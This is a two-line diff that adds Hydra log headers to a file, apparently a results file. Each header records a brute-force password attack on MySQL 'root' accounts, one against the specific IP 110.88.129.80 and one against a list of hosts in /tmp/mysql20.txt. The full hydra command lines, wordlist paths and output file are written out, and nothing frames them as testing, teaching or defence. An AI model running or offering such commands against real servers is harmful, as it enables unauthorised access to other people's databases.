@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-07-30 00:02:59 on 110.88.129.80 mysql (hydra -l root -P /tmp/big_pass.txt -t 1 -w 3 -o /tmp/mysql_result.txt mysql://110.88.129.80)
+# Hydra v9.2 run at 2026-08-04 07:21:27 on /tmp/mysql20.txt mysql (hydra -l root -P /tmp/pass.txt -M /tmp/mysql20.txt -t 4 -o /tmp/mysql_result.txt mysql)
